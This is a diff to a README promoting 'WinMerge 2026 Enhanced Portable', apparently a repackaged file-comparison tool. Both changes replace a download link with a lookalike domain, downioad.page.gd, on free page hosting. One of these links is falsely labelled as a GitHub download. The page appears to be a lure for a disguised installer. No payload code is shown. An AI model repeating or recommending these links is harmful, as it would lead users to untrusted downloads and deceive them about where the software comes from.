@@ -2,7 +2,7 @@
 
 WinMerge 2026 Enhanced Portable is a powerful and versatile file comparison and merging tool specifically designed for Windows 10 and 11. This enhanced version brings new features and improvements to help you efficiently compare and merge files and folders, with the added benefit of portability for use on the go.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ Absolutely. WinMerge provides extensive options to customize comparisons, such a
 
 For the latest version of WinMerge 2026 Enhanced Portable, please use the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
